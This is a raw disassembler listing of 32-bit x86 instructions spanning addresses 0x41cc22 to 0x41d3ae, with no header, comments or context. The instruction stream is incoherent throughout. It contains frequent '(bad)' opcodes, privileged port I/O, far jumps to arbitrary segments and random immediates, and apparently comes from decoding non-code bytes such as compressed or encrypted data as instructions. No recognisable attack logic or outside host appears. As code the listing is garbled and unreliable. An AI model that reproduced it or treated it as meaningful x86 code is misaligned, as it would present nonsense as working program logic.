  41cc22:	adc    dl,BYTE PTR [ebx+0x271c8e1b]
  41cc28:	push   edi
  41cc29:	punpcklwd mm5,DWORD PTR [esi-0x5c]
  41cc2d:	sbb    BYTE PTR ds:0x87364319,0xeb
  41cc34:	push   ebp
  41cc35:	rcl    BYTE PTR [edx-0x53436ba5],1
  41cc3b:	js     0x41cc05
  41cc3d:	push   ebx
  41cc3e:	sbb    eax,0xd2ed7390
  41cc43:	pop    ebp
  41cc44:	sub    BYTE PTR [esi-0x1c3d2cc2],bl
  41cc4a:	test   BYTE PTR [esi+0x48],al
  41cc4d:	mov    bl,0xdd
  41cc4f:	jl     0x41cc41
  41cc51:	hlt    
  41cc52:	mov    WORD PTR [eax+0x15],?
  41cc55:	adc    eax,0x7fcfb667
  41cc5a:	in     eax,dx
  41cc5b:	mov    ecx,0xb71832d9
  41cc60:	push   es
  41cc61:	out    dx,eax
  41cc62:	loopne 0x41cc66
  41cc64:	outs   dx,BYTE PTR ds:[esi]
  41cc65:	xchg   ecx,eax
  41cc66:	mov    ah,0x22
  41cc68:	(bad)  
  41cc69:	sub    al,0xf2
  41cc6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc6c:	fs inc ebp
  41cc6e:	sub    cl,BYTE PTR [edi-0x4ab6fcb1]
  41cc74:	out    dx,eax
  41cc75:	or     eax,0x994f1c4b
  41cc7a:	add    esi,edx
  41cc7c:	das    
  41cc7d:	adc    al,0xb0
  41cc7f:	or     DWORD PTR [edx+0x6b737d32],ebx
  41cc85:	pop    ss
  41cc86:	outs   dx,BYTE PTR ds:[esi]
  41cc87:	jmp    0x41ccc6
  41cc89:	cmp    BYTE PTR [edi-0x4c],0x3c
  41cc8d:	jns    0x41cd05
  41cc8f:	adc    BYTE PTR [esi],ch
  41cc91:	inc    edi
  41cc92:	mov    dh,0x1
  41cc94:	xor    al,0x7f
  41cc96:	dec    ecx
  41cc97:	imul   eax,DWORD PTR [ebx-0x543fed7],0xffffffb6
  41cc9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc9f:	imul   ebp,DWORD PTR [eax],0x1bddf74d
  41cca5:	xchg   esp,eax
  41cca6:	or     DWORD PTR [ecx],ebx
  41cca8:	sub    ebp,DWORD PTR [ebx+0x7cf51ae]
  41ccae:	ins    DWORD PTR es:[edi],dx
  41ccaf:	cmp    bh,BYTE PTR [edx]
  41ccb1:	add    eax,0xd509e2c5
  41ccb6:	mov    ch,0xe7
  41ccb8:	xchg   DWORD PTR [ecx],eax
  41ccba:	dec    edi
  41ccbb:	push   esp
  41ccbc:	cld    
  41ccbd:	and    esp,DWORD PTR [esi-0x73]
  41ccc0:	add    al,0xc4
  41ccc2:	fimul  DWORD PTR [ebp-0x48e25e0f]
  41ccc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccc9:	mov    al,0xf
  41cccb:	adc    al,0x1e
  41cccd:	mov    ebp,DWORD PTR [ebp-0x3df81a97]
  41ccd3:	mov    DWORD PTR [ebx+esi*2-0x31],esp
  41ccd7:	out    dx,al
  41ccd8:	nop
  41ccd9:	daa    
  41ccda:	add    BYTE PTR [eax+0x34],0x9d
  41ccde:	sbb    ch,BYTE PTR [ebp-0x2015c225]
  41cce4:	xchg   ebx,eax
  41cce5:	lock push esp
  41cce7:	outs   dx,DWORD PTR ds:[esi]
  41cce8:	mov    ebp,0xbb2c8d0
  41cced:	sub    al,0xb
  41ccef:	pop    es
  41ccf0:	aas    
  41ccf1:	push   ecx
  41ccf2:	sbb    cl,bh
  41ccf4:	jle    0x41cd06
  41ccf6:	sbb    bl,BYTE PTR [eax+ebx*2-0x28]
  41ccfa:	int    0x4
  41ccfc:	hlt    
  41ccfd:	out    dx,eax
  41ccfe:	dec    eax
  41ccff:	sbb    al,0xe2
  41cd01:	sbb    DWORD PTR [esi+esi*8],edi
  41cd04:	jnp    0x41cd4e
  41cd06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd07:	inc    esp
  41cd08:	push   ebp
  41cd09:	xor    bh,bl
  41cd0b:	mov    eax,0xe9470f6b
  41cd10:	inc    eax
  41cd11:	jle    0x899a54cb
  41cd17:	add    ch,bl
  41cd19:	cmp    eax,0xe0490b89
  41cd1e:	dec    esp
  41cd1f:	jecxz  0x41ccff
  41cd21:	fidiv  DWORD PTR ds:0x3e73610d
  41cd27:	aas    
  41cd28:	or     dh,bl
  41cd2a:	fwait
  41cd2b:	pop    eax
  41cd2c:	inc    eax
  41cd2d:	pop    edi
  41cd2e:	inc    edx
  41cd2f:	jmp    0x41cd1c
  41cd31:	cmp    eax,0xaf6e388
  41cd36:	sub    al,BYTE PTR [ebx+0x25f827a8]
  41cd3c:	je     0x41cccc
  41cd3e:	xchg   edx,eax
  41cd3f:	xlat   BYTE PTR ds:[ebx]
  41cd40:	retf   0xce9b
  41cd43:	or     BYTE PTR [esi-0x2ecc7940],al
  41cd49:	scas   al,BYTE PTR es:[edi]
  41cd4a:	ret    0xd954
  41cd4d:	mov    edx,ebx
  41cd4f:	add    al,0x65
  41cd51:	popf   
  41cd52:	dec    ebp
  41cd53:	out    dx,eax
  41cd54:	sbb    BYTE PTR [ecx],dh
  41cd56:	gs je  0x41cd3c
  41cd59:	adc    al,0xa8
  41cd5b:	xor    ch,bl
  41cd5d:	aam    0x71
  41cd5f:	and    DWORD PTR [ebx+0x1f],ebx
  41cd62:	or     BYTE PTR [edi+0x4b7760c5],0x16
  41cd69:	fisttp QWORD PTR [edi+edx*2]
  41cd6c:	xor    al,BYTE PTR [esi+0x70e38cff]
  41cd72:	lock adc DWORD PTR [edi+0x468a9066],esp
  41cd79:	call   0x6d3f:0x8f62ffce
  41cd80:	push   0x770ec85
  41cd85:	push   cs
  41cd86:	out    0x66,eax
  41cd88:	(bad)  
  41cd89:	mov    bl,0x6a
  41cd8b:	repz cmp al,0xc7
  41cd8e:	and    BYTE PTR [eax+0x1a],al
  41cd91:	xchg   DWORD PTR [ecx-0x7e8312a4],edi
  41cd97:	into   
  41cd98:	out    dx,eax
  41cd99:	arpl   ax,bp
  41cd9b:	or     ebx,DWORD PTR cs:[ecx]
  41cd9e:	jmp    FWORD PTR [edi-0x176e3ae7]
  41cda4:	iret   
  41cda5:	stc    
  41cda6:	xor    al,0x5f
  41cda8:	mov    ebp,DWORD PTR [eax-0x64fc6274]
  41cdae:	add    ch,BYTE PTR [esi]
  41cdb0:	dec    ecx
  41cdb1:	icebp  
  41cdb2:	je     0x41cdef
  41cdb4:	ds loope 0x41ce16
  41cdb7:	adc    eax,0xd223bb44
  41cdbc:	mov    al,ds:0x97984ee2
  41cdc1:	jns    0x41ce3d
  41cdc3:	test   eax,0x92308d9c
  41cdc8:	cmp    eax,0x85c2b30
  41cdcd:	(bad)  
  41cdce:	icebp  
  41cdcf:	(bad)  
  41cdd0:	xlat   BYTE PTR ds:[ebx]
  41cdd1:	adc    eax,0x32daa1bd
  41cdd6:	imul   ebx,DWORD PTR [edi+0x2b707089],0x37
  41cddd:	xor    dh,bh
  41cddf:	sbb    edx,0x86666fdc
  41cde5:	push   esp
  41cde6:	sbb    al,0x2
  41cde8:	fxch   st(1)
  41cdea:	cmp    dh,cl
  41cdec:	aas    
  41cded:	pusha  
  41cdee:	clc    
  41cdef:	cmp    edi,DWORD PTR [esi]
  41cdf1:	xor    DWORD PTR [ebp+0x52],ebx
  41cdf4:	mov    esp,DWORD PTR [edi]
  41cdf6:	int    0xe4
  41cdf8:	loopne 0x41cdd9
  41cdfa:	mov    ds:0x69ab5c36,eax
  41cdff:	push   ss
  41ce00:	add    al,0x6d
  41ce02:	xchg   ebx,eax
  41ce03:	popa   
  41ce04:	popa   
  41ce05:	lods   eax,DWORD PTR ds:[esi]
  41ce06:	cld    
  41ce07:	mov    ebp,0x28b85cd2
  41ce0c:	mov    esi,0xa24d2c40
  41ce11:	enter  0x6ff0,0xb
  41ce15:	jmp    0xa175:0x405a12c6
  41ce1c:	retf   
  41ce1d:	das    
  41ce1e:	sub    al,0xcd
  41ce20:	sbb    al,0x46
  41ce22:	or     eax,0xe2711f39
  41ce27:	ret    
  41ce28:	sbb    eax,ebp
  41ce2a:	gs or  bh,dl
  41ce2d:	jne    0x41cde8
  41ce2f:	pop    ebp
  41ce30:	lahf   
  41ce31:	mov    ds:0xbabd38e9,al
  41ce36:	jmp    0x508eb9e4
  41ce3b:	push   ss
  41ce3c:	in     eax,0x23
  41ce3e:	sub    DWORD PTR [eax-0x1683c0e5],edi
  41ce44:	pop    esp
  41ce45:	push   cs
  41ce46:	call   0x48623523
  41ce4b:	jo     0x41cdd4
  41ce4d:	fwait
  41ce4e:	inc    edi
  41ce4f:	push   0xffffffe6
  41ce51:	sub    bh,BYTE PTR [esi+ebx*1+0x54]
  41ce55:	mov    al,0xfa
  41ce57:	jnp    0x41cea2
  41ce59:	cdq    
  41ce5a:	and    eax,0xaddb2d01
  41ce5f:	push   fs
  41ce61:	jne    0x41ceb1
  41ce63:	jmp    0xb5939ba2
  41ce68:	push   es
  41ce69:	enter  0xcebb,0x1e
  41ce6d:	daa    
  41ce6e:	inc    esi
  41ce70:	mov    BYTE PTR [edi+ebp*2-0x21],0xc2
  41ce75:	sub    DWORD PTR [ebp-0x2cfb4e5b],0xb715c0
  41ce7f:	iret   
  41ce80:	sub    edi,DWORD PTR [ebx-0x45]
  41ce83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce84:	jecxz  0x41ce0a
  41ce86:	inc    ecx
  41ce87:	adc    eax,0x6c755980
  41ce8c:	push   edx
  41ce8d:	mov    ecx,0x3ca8ba29
  41ce92:	in     eax,dx
  41ce93:	pop    ebx
  41ce94:	(bad)  
  41ce96:	mov    eax,ds:0x353440cf
  41ce9b:	cli    
  41ce9c:	fwait
  41ce9d:	mov    ebx,edi
  41ce9f:	pop    es
  41cea0:	dec    edx
  41cea1:	ss or  ebp,DWORD PTR es:[edi]
  41cea5:	and    ch,ch
  41cea7:	adc    al,BYTE PTR [esi+0x67]
  41ceaa:	sub    bh,BYTE PTR [esi-0x18]
  41cead:	add    eax,0x4143a0be
  41ceb2:	cmp    dh,BYTE PTR [ebx-0x40]
  41ceb5:	les    edx,FWORD PTR [ebx-0x3d]
  41ceb8:	sbb    bl,BYTE PTR [ebx-0x36]
  41cebb:	ja     0x41cefb
  41cebd:	xchg   esi,eax
  41cebe:	popf   
  41cebf:	test   al,0x1e
  41cec1:	retf   
  41cec2:	push   ecx
  41cec3:	dec    cl
  41cec5:	cmp    dl,bl
  41cec7:	pop    ebx
  41cec8:	ss inc eax
  41ceca:	stos   BYTE PTR es:[edi],al
  41cecb:	(bad)  
  41cecc:	fbstp  TBYTE PTR [esi+esi*2+0x1e874738]
  41ced3:	std    
  41ced4:	popa   
  41ced5:	stos   DWORD PTR es:[edi],eax
  41ced6:	add    BYTE PTR [edi+0x502f0f8b],al
  41cedc:	mov    al,0x64
  41cede:	sub    BYTE PTR [ebx-0x23],0xf4
  41cee2:	sub    edx,ecx
  41cee4:	jae    0x41cecf
  41cee6:	dec    edx
  41cee7:	cld    
  41cee8:	mul    BYTE PTR [ebp-0x3c]
  41ceeb:	mov    ecx,0x6b4bf08
  41cef0:	es in  eax,dx
  41cef2:	imul   ebx,DWORD PTR [edi-0xb],0x2f
  41cef6:	inc    ecx
  41cef7:	cmp    BYTE PTR [edi-0x324862c7],bh
  41cefd:	(bad)
  41cf00:	out    dx,al
  41cf01:	std    
  41cf02:	mov    bl,0x41
  41cf04:	inc    esi
  41cf05:	pop    ecx
  41cf06:	sub    eax,DWORD PTR [ebx+0x10d45622]
  41cf0c:	sbb    BYTE PTR [eax+eax*2-0x35],cl
  41cf10:	in     al,dx
  41cf11:	retf   
  41cf12:	push   ss
  41cf13:	mov    al,ds:0x1039fee
  41cf18:	in     al,0x62
  41cf1a:	cmc    
  41cf1b:	cs ins DWORD PTR es:[edi],dx
  41cf1d:	mov    edx,edx
  41cf1f:	imul   eax,ecx,0x53
  41cf22:	mov    dh,0xc4
  41cf24:	jg     0x41cefd
  41cf26:	cld    
  41cf27:	retf   0x7871
  41cf2a:	sbb    BYTE PTR [ecx+0x6ae393e8],dl
  41cf30:	inc    ebx
  41cf31:	int3   
  41cf32:	mov    al,ds:0x1f3662f
  41cf37:	xchg   DWORD PTR [ebp-0x78],ebx
  41cf3a:	mov    DWORD PTR [ecx+0x2],esp
  41cf3d:	mov    ah,0x94
  41cf3f:	mov    ch,0x84
  41cf41:	test   BYTE PTR [edx],ch
  41cf43:	push   eax
  41cf44:	test   al,0x4d
  41cf46:	(bad)  
  41cf47:	xchg   ecx,eax
  41cf48:	adc    bh,BYTE PTR [edx+0x436687bd]
  41cf4e:	pop    DWORD PTR [esi]
  41cf50:	lods   eax,DWORD PTR ds:[esi]
  41cf51:	mov    ch,0x2a
  41cf53:	mov    edi,0x717730cf
  41cf58:	jno    0x41cef2
  41cf5a:	jp     0x41cf01
  41cf5c:	scas   eax,DWORD PTR es:[edi]
  41cf5d:	pop    ds
  41cf5e:	retf   0x1c96
  41cf61:	inc    esp
  41cf62:	rcl    DWORD PTR [ebx+ebp*2-0x7e812839],1
  41cf69:	sub    bh,BYTE PTR [edi-0x9]
  41cf6c:	idiv   DWORD PTR [edi+0x39]
  41cf6f:	fistp  QWORD PTR [esi-0x1d09c72b]
  41cf75:	push   ecx
  41cf76:	mov    dh,0x2d
  41cf78:	add    al,0x5d
  41cf7a:	je     0x41cf7d
  41cf7c:	sub    eax,0xd3a4bb1e
  41cf81:	aam    0xd7
  41cf83:	cmp    esp,DWORD PTR [edx-0x44]
  41cf86:	dec    esi
  41cf87:	ins    DWORD PTR es:[edi],dx
  41cf88:	mov    ah,0x6f
  41cf8a:	push   es
  41cf8b:	mov    ebx,0x1730539d
  41cf90:	(bad)  
  41cf91:	stos   BYTE PTR es:[edi],al
  41cf92:	shl    BYTE PTR [ebp-0x52560ffc],cl
  41cf98:	das    
  41cf99:	pusha  
  41cf9a:	push   ds
  41cf9b:	out    0xea,al
  41cf9d:	sbb    esp,0x11
  41cfa0:	and    bh,BYTE PTR [edx+0x20f41d36]
  41cfa6:	xor    al,BYTE PTR [esi+0x44]
  41cfa9:	fnstsw WORD PTR [esp+eiz*2-0x158e3a35]
  41cfb0:	xchg   esp,eax
  41cfb1:	mov    BYTE PTR [ebx+0xd],cl
  41cfb4:	inc    eax
  41cfb5:	ds pop edx
  41cfb7:	fidivr DWORD PTR [edi-0x57215285]
  41cfbd:	add    DWORD PTR ss:[edx],ecx
  41cfc0:	mov    dh,BYTE PTR [ecx]
  41cfc2:	sub    BYTE PTR [eax],ch
  41cfc4:	rol    BYTE PTR [ebx+0x32de703a],cl
  41cfca:	fcomp  QWORD PTR [ecx+ecx*2-0x4c]
  41cfce:	xor    DWORD PTR [ebx+0x75],ecx
  41cfd1:	pop    ecx
  41cfd2:	pop    esp
  41cfd3:	push   ds
  41cfd4:	mov    edi,0xd96925e8
  41cfd9:	mov    ds:0x8619c04c,al
  41cfde:	out    0xc1,eax
  41cfe0:	jecxz  0x41d053
  41cfe2:	stos   DWORD PTR es:[edi],eax
  41cfe3:	adc    al,0x50
  41cfe5:	mov    ebx,eax
  41cfe7:	mov    bh,0xa
  41cfe9:	imul   edx,DWORD PTR [eax-0x3f2491d8],0x6ebdebb9
  41cff3:	iret   
  41cff4:	push   edx
  41cff5:	sub    eax,0x8a5422ea
  41cffa:	adc    cl,dh
  41cffc:	push   eax
  41cffd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cffe:	jno    0x41cfcd
  41d000:	inc    ebx
  41d001:	inc    si
  41d003:	icebp  
  41d004:	cmp    al,0x12
  41d006:	shld   ebp,eax,0xc1
  41d00a:	mov    dl,0xa
  41d00c:	fstp   DWORD PTR ds:0xb1ed1921
  41d012:	inc    esi
  41d013:	sub    bh,BYTE PTR [edx-0x28]
  41d016:	ret    0x9027
  41d019:	js     0x41d018
  41d01b:	not    BYTE PTR [esi+0x35]
  41d01e:	rcr    DWORD PTR [ebx+0x34],cl
  41d021:	or     ah,bl
  41d023:	xchg   BYTE PTR [ecx+0x3b],bl
  41d026:	in     eax,0xad
  41d028:	push   ebp
  41d029:	js     0x41d027
  41d02b:	xchg   BYTE PTR fs:[esp+ebx*2],ch
  41d02f:	inc    edx
  41d030:	adc    BYTE PTR [edx-0x17053efa],dl
  41d036:	hlt    
  41d037:	inc    edi
  41d038:	add    eax,0xc99e46df
  41d03d:	push   0x3c
  41d03f:	dec    edx
  41d040:	in     al,dx
  41d041:	int    0x90
  41d043:	aam    0x7f
  41d045:	neg    DWORD PTR [edi-0x26023332]
  41d04b:	adc    dh,0xd4
  41d04e:	xor    DWORD PTR [ebx+edi*8+0x6366dfb0],eax
  41d055:	into   
  41d056:	jmp    0x41d0a3
  41d058:	fidivr WORD PTR [eax+0x5f]
  41d05b:	add    ebx,DWORD PTR [ebp+0x266f8db2]
  41d061:	pop    ebx
  41d062:	push   0xffffffa5
  41d064:	ja     0x41d070
  41d066:	jecxz  0x41d02f
  41d068:	push   ds
  41d069:	mov    esi,0x7102ec56
  41d06e:	popa   
  41d06f:	and    DWORD PTR [eax+0x64],ebx
  41d072:	mov    edi,0xcde9f241
  41d077:	(bad)  
  41d078:	je     0x41d047
  41d07a:	cli    
  41d07b:	sbb    BYTE PTR [esi],bl
  41d07d:	xor    eax,0x67007994
  41d082:	add    eax,0x92b23e0d
  41d087:	mov    ds:0xa417a680,eax
  41d08c:	adc    bl,BYTE PTR [ebp+0x29]
  41d08f:	xlat   BYTE PTR ds:[ebx]
  41d090:	dec    edi
  41d091:	inc    ecx
  41d092:	jb     0x41d09e
  41d094:	aaa    
  41d095:	push   es
  41d096:	(bad)  [eax+ebx*8]
  41d099:	sub    eax,0x93749dbb
  41d09e:	pop    ds
  41d09f:	popf   
  41d0a0:	inc    esi
  41d0a1:	and    al,BYTE PTR [edi+0x2b]
  41d0a4:	ss mov esi,0x1e480b41
  41d0aa:	cmp    BYTE PTR [ebx],ch
  41d0ac:	std    
  41d0ad:	pop    ss
  41d0ae:	data16 js 0x41d0bf
  41d0b1:	xor    al,0xb2
  41d0b3:	dec    edi
  41d0b4:	dec    ecx
  41d0b5:	mov    bl,0xe5
  41d0b7:	fild   WORD PTR [eax+0x4e]
  41d0ba:	jl     0x41d11e
  41d0bc:	push   0x52b1fabd
  41d0c1:	xor    esi,DWORD PTR [ecx]
  41d0c3:	(bad)  
  41d0c4:	sub    ah,BYTE PTR [esi+0x10]
  41d0c7:	push   ss
  41d0c8:	shl    si,1
  41d0cb:	iret   
  41d0cc:	jbe    0x41d128
  41d0ce:	inc    esp
  41d0cf:	stos   DWORD PTR es:[edi],eax
  41d0d0:	xor    DWORD PTR [ebp+0x1b],0xe49e8260
  41d0d7:	or     al,0xaf
  41d0d9:	jle    0x41d0c7
  41d0db:	sub    DWORD PTR [ebx+eiz*1-0x1a78d4ec],ebp
  41d0e2:	sbb    eax,0x634030e4
  41d0e7:	mov    eax,ds:0xeb3af5c6
  41d0ec:	ret    0xfee2
  41d0ef:	es jae 0x41d160
  41d0f2:	retf   0x8ca5
  41d0f5:	test   eax,0xe5e8adfb
  41d0fa:	sbb    cx,WORD PTR [ebp-0x4f286b45]
  41d101:	jg     0x41d12f
  41d103:	xchg   BYTE PTR [ecx],cl
  41d105:	adc    BYTE PTR [ebp-0x37],0xeb
  41d109:	jge    0x41d0b9
  41d10b:	push   es
  41d10c:	mov    ds,ecx
  41d10e:	mov    eax,0xe07eb7bf
  41d113:	mov    ds,WORD PTR [esi-0x63]
  41d116:	push   ebp
  41d117:	arpl   WORD PTR [eax-0x16],bp
  41d11a:	cmp    BYTE PTR ds:0x3d0b0de5,bl
  41d120:	jne    0x41d157
  41d122:	jmp    0x11e0:0xbfaec846
  41d129:	dec    esp
  41d12a:	popf   
  41d12b:	nop
  41d12c:	cmc    
  41d12d:	sbb    BYTE PTR [ebx+ebp*8-0x6b],dh
  41d131:	mov    WORD PTR [edi+ecx*2-0x2c],gs
  41d135:	clc    
  41d136:	repnz inc eax
  41d138:	fdivr  QWORD PTR [ebx]
  41d13a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d13b:	shr    BYTE PTR [ebp+0x1101b22e],0x36
  41d142:	sub    bh,BYTE PTR fs:[edi*1+0x3338ae91]
  41d14a:	mov    ds:0xcb91c32d,eax
  41d14f:	jno    0x41d11d
  41d151:	mov    dl,0x84
  41d153:	xchg   edx,eax
  41d154:	inc    ebx
  41d155:	jmp    FWORD PTR [ecx-0x1db6b0bc]
  41d15b:	aam    0x2a
  41d15d:	xchg   DWORD PTR [edx+0x2c],eax
  41d160:	push   0x555d3191
  41d165:	xchg   edx,eax
  41d166:	and    eax,DWORD PTR [ebx-0x288be709]
  41d16c:	add    dh,BYTE PTR [edx-0x63768d74]
  41d172:	fld    DWORD PTR ds:0x889517aa
  41d178:	jno    0x41d1f7
  41d17a:	neg    BYTE PTR [eax]
  41d17c:	lods   eax,DWORD PTR ds:[esi]
  41d17d:	pop    ss
  41d17e:	out    dx,al
  41d17f:	add    BYTE PTR [ecx+0x40],dh
  41d182:	inc    edi
  41d183:	dec    ecx
  41d184:	arpl   sp,bp
  41d186:	lods   eax,DWORD PTR ds:[esi]
  41d187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d188:	std    
  41d189:	stc    
  41d18a:	add    edx,ecx
  41d18c:	(bad)  
  41d18e:	xchg   BYTE PTR ds:0xd452db68,ch
  41d194:	xchg   ebp,eax
  41d195:	out    dx,eax
  41d196:	outs   dx,DWORD PTR ds:[esi]
  41d197:	and    BYTE PTR [edx],bl
  41d199:	inc    ecx
  41d19a:	fdiv   DWORD PTR gs:[esp+ebp*1+0x27]
  41d19f:	test   DWORD PTR [ebx+ebp*2+0x399509c9],esi
  41d1a6:	xor    ebp,DWORD PTR [edx+0x69c4e138]
  41d1ac:	jl     0x41d1bb
  41d1ae:	mov    WORD PTR [eax-0xe8d85be],?
  41d1b4:	scas   eax,DWORD PTR es:[edi]
  41d1b5:	int3   
  41d1b6:	push   ecx
  41d1b7:	fwait
  41d1b8:	cmp    DWORD PTR [esi+0x43],ebx
  41d1bb:	xchg   ebx,eax
  41d1bc:	or     eax,0x22ee2bce
  41d1c1:	fdivr  DWORD PTR [ecx]
  41d1c3:	aad    0xd2
  41d1c5:	jae    0x41d1bf
  41d1c7:	ins    DWORD PTR es:[edi],dx
  41d1c8:	xchg   esi,eax
  41d1c9:	into   
  41d1ca:	jne    0x41d1af
  41d1cc:	push   es
  41d1cd:	fwait
  41d1ce:	sar    DWORD PTR [edi],1
  41d1d0:	je     0x41d16c
  41d1d2:	rol    DWORD PTR [edi],cl
  41d1d4:	push   eax
  41d1d5:	push   ecx
  41d1d6:	repz lea edi,[edx+0x76ce4485]
  41d1dd:	rcr    BYTE PTR [eax],cl
  41d1df:	arpl   WORD PTR [ebx],cx
  41d1e1:	cmp    eax,0xc197864d
  41d1e6:	pop    ebx
  41d1e7:	dec    eax
  41d1e8:	test   esi,ebp
  41d1ea:	imul   edx,DWORD PTR [edx],0x4f
  41d1ed:	xchg   BYTE PTR [edx+ebx*8-0x80],bh
  41d1f1:	mov    dh,ch
  41d1f3:	fsubr  QWORD PTR [edx+0x4014f826]
  41d1f9:	add    esi,DWORD PTR [ecx+eiz*4+0x5203d4ee]
  41d200:	mov    al,ds:0xb77586c0
  41d205:	fstp   DWORD PTR [esi+0x66]
  41d208:	inc    ecx
  41d209:	mov    esi,0xa2ccfab0
  41d20e:	xor    eax,DWORD PTR [esi+0x619672f9]
  41d214:	outs   dx,DWORD PTR ds:[esi]
  41d215:	sbb    DWORD PTR [esi],esp
  41d217:	pop    edi
  41d218:	xchg   ebp,eax
  41d219:	xchg   ebp,eax
  41d21a:	push   ebx
  41d21b:	test   al,0x82
  41d21d:	enter  0x83ee,0x84
  41d221:	in     eax,0x9f
  41d223:	sti    
  41d224:	jecxz  0x41d2a1
  41d226:	add    BYTE PTR [esi+0x44],dh
  41d229:	add    ch,0x80
  41d22c:	dec    esi
  41d22d:	stc    
  41d22e:	mov    ecx,0xd1cf55cf
  41d233:	or     ebx,DWORD PTR [edi+0x43d20a4d]
  41d239:	xchg   edi,eax
  41d23a:	aam    0x3d
  41d23c:	mov    esi,0x92da6d39
  41d241:	mov    WORD PTR [eax-0x190148ac],ss
  41d247:	rol    BYTE PTR [edx],1
  41d249:	in     al,0xf
  41d24b:	lock push cs
  41d24d:	hlt    
  41d24e:	dec    ecx
  41d24f:	mov    esp,0xa40e0698
  41d254:	(bad)
  41d257:	ja     0x41d292
  41d259:	in     eax,0xe6
  41d25b:	lods   al,BYTE PTR ds:[esi]
  41d25c:	les    edx,FWORD PTR [eax+0x6557a037]
  41d262:	xor    DWORD PTR [ecx+0x6d],esp
  41d265:	test   eax,0x595caa3f
  41d26a:	pushf  
  41d26b:	add    esp,DWORD PTR [edx+0x4]
  41d26e:	repz jecxz 0x41d21b
  41d271:	xor    BYTE PTR [esi-0xa],bl
  41d274:	pop    ss
  41d275:	mov    es,WORD PTR [edx-0x1a]
  41d278:	push   ebx
  41d279:	mov    bl,0x67
  41d27b:	jmp    0x648c:0xaf5bef73
  41d282:	lds    ecx,FWORD PTR [edx-0x6d]
  41d285:	xchg   DWORD PTR [edi+0x7b7924ff],ebx
  41d28b:	aaa    
  41d28c:	les    ecx,FWORD PTR [ebx-0x542c412e]
  41d292:	xchg   esi,eax
  41d293:	out    dx,eax
  41d294:	inc    ebp
  41d295:	lea    ebp,[eax-0x73]
  41d298:	xchg   esp,eax
  41d299:	dec    esi
  41d29a:	and    edx,eax
  41d29c:	cs pop edx
  41d29e:	jge    0x41d300
  41d2a0:	out    dx,al
  41d2a1:	fdiv   DWORD PTR [esi+0x4ef6e242]
  41d2a7:	sub    al,0x3
  41d2a9:	pop    es
  41d2aa:	push   edi
  41d2ab:	jbe    0x41d242
  41d2ad:	jp     0x41d246
  41d2af:	mov    dl,0xc
  41d2b1:	or     BYTE PTR [eax-0x4a],al
  41d2b4:	daa    
  41d2b5:	mov    edi,0x4d4c1d4f
  41d2ba:	std    
  41d2bb:	xchg   edx,eax
  41d2bc:	div    DWORD PTR [ecx-0x40534c9]
  41d2c2:	not    DWORD PTR [esi-0x13]
  41d2c5:	test   eax,0x1ec1491a
  41d2ca:	inc    ebx
  41d2cb:	mov    al,0x1f
  41d2cd:	daa    
  41d2ce:	cwde   
  41d2cf:	add    DWORD PTR [esp+esi*8+0xd],esp
  41d2d3:	fist   WORD PTR [ecx-0x53aa2906]
  41d2d9:	or     bl,0xf2
  41d2dc:	enter  0xea6f,0xf0
  41d2e0:	and    edx,DWORD PTR [esi+ecx*4+0x38c90536]
  41d2e7:	ror    DWORD PTR [esi],0x73
  41d2ea:	jns    0x41d2db
  41d2ec:	push   esp
  41d2ed:	xor    al,0x43
  41d2f0:	das    
  41d2f1:	jno    0x41d2a3
  41d2f3:	cmp    DWORD PTR [edi-0x7688396b],edi
  41d2f9:	pop    edx
  41d2fa:	add    eax,0x25cbc83
  41d2ff:	add    eax,edx
  41d301:	sub    ecx,DWORD PTR [edi-0x34120202]
  41d307:	and    DWORD PTR [ecx-0x5291dac3],esi
  41d30d:	xor    esi,DWORD PTR [eax+0x559e1720]
  41d313:	inc    ebx
  41d314:	or     ch,0x67
  41d317:	push   0xffffff89
  41d319:	mov    esi,0xe1ff013d
  41d31e:	call   0x47f06f3a
  41d323:	jo     0x41d2e3
  41d325:	push   0xffffffc6
  41d327:	ficom  DWORD PTR [edx+0x69]
  41d32a:	popa   
  41d32b:	imul   esi,DWORD PTR [edx+edi*2],0xffffffa7
  41d32f:	push   esp
  41d330:	cmp    al,0x9
  41d332:	fisub  WORD PTR [ebx]
  41d334:	mov    ecx,0x17201d07
  41d339:	inc    ecx
  41d33a:	dec    esi
  41d33b:	fcom   QWORD PTR ds:0xa1bbac57
  41d341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d342:	jl     0x41d315
  41d344:	cwde   
  41d345:	dec    eax
  41d346:	and    dh,cl
  41d348:	xor    DWORD PTR [eax],edx
  41d34a:	fidiv  WORD PTR [edx]
  41d34c:	mov    WORD PTR [eax],fs
  41d34e:	xchg   ecx,eax
  41d34f:	or     BYTE PTR [edx+0x69],0xdd
  41d353:	mov    DWORD PTR [edx],ebp
  41d355:	retf   0x3a0a
  41d358:	imul   esp,DWORD PTR [ecx],0x9acc96da
  41d35e:	je     0x41d34a
  41d360:	mov    dh,0xa7
  41d362:	outs   dx,BYTE PTR ds:[esi]
  41d363:	jmp    0x64e5:0x63ecf450
  41d36a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d36b:	fld    DWORD PTR [ebx-0x45]
  41d36e:	ret    0x5d73
  41d371:	add    ebp,DWORD PTR [eax-0xef987e7]
  41d377:	adc    DWORD PTR [eax+0x68],0xffffffea
  41d37b:	dec    ebp
  41d37c:	test   DWORD PTR ds:0x474cbd73,0xbcbafafc
  41d386:	jb     0x41d388
  41d388:	bound  edi,QWORD PTR [edi+esi*4+0xd5ccc16]
  41d38f:	lea    esi,[esi-0x6c8f26c]
  41d395:	dec    ecx
  41d396:	mov    al,0x2a
  41d398:	add    dl,cl
  41d39a:	push   esi
  41d39b:	(bad)  
  41d39c:	cmp    al,0xa0
  41d39e:	and    edi,esp
  41d3a0:	ficomp DWORD PTR [eax+ebp*4+0x5e]
  41d3a4:	bound  ebx,QWORD PTR [edi-0x53300356]
  41d3aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3ab:	sub    DWORD PTR [ebx],0x22
  41d3ae:	jg     0x41d42a
